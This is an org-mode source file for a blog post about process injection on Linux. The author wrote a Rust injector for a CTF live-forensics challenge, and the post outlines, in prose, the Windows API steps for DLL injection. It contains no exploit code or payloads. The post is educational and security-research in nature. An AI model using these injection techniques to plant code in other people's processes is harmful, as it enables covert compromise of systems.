content-org/linux_process_injection.org
#+cite_export: csl ~/Documents/Blog/public_page/content-org/ieee.csl
#+hugo_base_dir: ../
#+HUGO_CUSTOM_FRONT_MATTER: :author "Konstantin Bücheler"
#+HUGO_PAIRED_SHORTCODES: admonition
#+bibliography: ~/Documents/Blog/public_page/content-org/Bib.bib
* DONE Linux Process Injection
CLOSED: [2023-11-05 Sun 16:37]
:PROPERTIES:
:EXPORT_FILE_NAME: linux-process-injection
:EXPORT_HUGO_CUSTOM_FRONT_MATTER+: :header '((image . "preview/favicon-32x32.png") (caption . "Dynamic Library Injection on Linux using Rust."))
:END:
#+filetags: linux, rust, ctf
#+OPTIONS: toc:2
#+begin_description
Dynamic Library Injection on Linux using Rust
#+end_description
** Introduction
This year, I contributed some challenges to the Cyber Security Challenge Germany ([[https://cscg.de/][CSCG]]), a CTF for young IT security talents, which also serves as the German qualification for the European Cyber Security Challenge ([[https://ecsc.eu/][ECSC]]).
For the on-site finals, I created a small Windows Live Forensics challenge where each team was given RDP access to a Windows server and a scenario where they had to act as incident responders.

The server was infected with an unknown malware that injected a DLL into a remote process. The DLL, or implant, was communicating with a C2 server. This channel was used to receive further commands or retrieve the flag.

As the CSCG final was an on-site event with few participants, and incident response/live forensics challenges seem to be quite rare, I wanted to reuse the challenge for the public [[https://ctftime.org/event/2048][CCCamp 2023]] CTF. Nevertheless, since spawning a dedicated Windows server per team does not scale well, I decided to port the challenge to Linux.

To avoid starting from scratch, I decided to stick to injecting the implant as a dynamic library, which I could port to Linux by simply compiling them as a shared object file (.so) instead of the DLL.
This way, I only had to modify the injector, which I assumed wouldn't be much more difficult than on Windows.
However, I soon realized that Linux lacks the convenient Win32 API functions for manipulating remote processes, such as ~VirtualAllocEx~ or ~WriteProcessMemory~.

I discovered some existing projects that address remote process injection on Linux. However, [[https://github.com/gaffe23/linux-inject/][linux-inject]] [cite:@linux_inject], which is pretty old,
did not work for my implant on latest Ubuntu machines. The other project I found, part of [[https://github.com/antifob/linux-prinj/][linux-prinj]] [cite:@fob_code], is written in Python,
which did not really meet my requirements.

Rather than debugging existing tools, I chose to develop my own in Rust. This decision was influenced by the fact that the implant was written in Rust and the context around the challenge suggested Rust malware.
My implementation is a Rust adaptation of the Python implementation by [[https://github.com/antifob/linux-prinj/][linux-prinj]] [[https://github.com/antifob][antifob]], with some aspects being more of a direct port.

This post introduces my Rust library, [[https://github.com/d0ntrash/so_injection][so_injection]], which injects a shared object into a running process.
If you are interested in the CTF challenge, you can check out the [[https://github.com/allesctf/campctf-2023/tree/main/challenges/live-forensics][source]] or a [[https://spiker00t.github.io/live-forensics][writeup]] by spiker00t.
For further details on Linux process injection techniques in general, see [[https://blog.f0b.org/2022/05/process-injection-on-linux-introduction/][antifob]]'s great blog series [cite:@f0b].

** Dynamic Libraries
The concept behind dynamic libraries, or shared libraries, is pretty much the same on both Linux and Windows.
Windows refers to them as dynamic-link libraries (DLL), while on Linux they're known as shared objects (so). As such, DLL injection is the term commonly used for dynamic library injection on Windows, and shared object injection is what I will call it on Linux.

A dynamic library usually holds reusable code that can be shared by multiple programs at the same time.  These libraries are loaded into a program's memory at runtime, allowing it to access their functions and resources.
On Linux, the dynamic library most frequently utilized is ~libc.so~, whereas on Windows, it is ~kernel32.dll~ and ~ntdll.dll~.

Normally, a dynamic library is loaded using an API function provided by the operating system.
On Windows, this is [[https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya][~LoadLibrary~]], which is part of the Win32 API, and on Linux, its [[https://man7.org/linux/man-pages/man3/dlopen.3.html][~dlopen~]], part of libc.
Once the library is loaded, the host process can resolve exported functions by their symbols and invoke them.
Also, a dynamic library can declare an automatically called constructor upon loading.

** Injecting Dynamic Libraries
Injecting dynamic libraries is a technique that is often used and abused for various purposes, such as debugging, adding functionality, or modifying the behavior of a running program.

A library can either be injected at runtime by interacting with a running process, or it can be preloaded into a program's address space before it starts. The dynamic method is largely used on Windows, such as by EDRs or anti-cheat engines, while preloading is predominantly used on Linux.

*** Windows
As mentioned above, injecting DLLs is easy on Windows because Windows provides an API that does most of the work.
The following provides an overview of the basic procedure:
- ~OpenProcess()~: Get the handle for a running process with full access privileges
- ~VirtualAllocEx()~: Allocates memory in the address space or a remote process
- ~WriteProcessMemory()~: Write the path to the DLL that should be injected into the newly allocated buffer
- ~GetModuleHandle()~ and ~GetProcAddress()~: Get the handle for ~kernel32.dll~, then get the address of ~LoadLibraryA~ in ~kernel32.dll~
- ~CreateRemoteThread()~: Create a new thread in the context of the remote process

The newly created thread loads the DLL we want to inject into the target process by calling ~LoadLibraryA~ with the DLL's path as a parameter.
Once the loading is complete, the DLL's entry point ~DllMain~ is called.

As shown, injecting DLLs on Windows is as simple as calling certain Win32 API endpoints.
On Linux, unfortunately, it is not as simple.

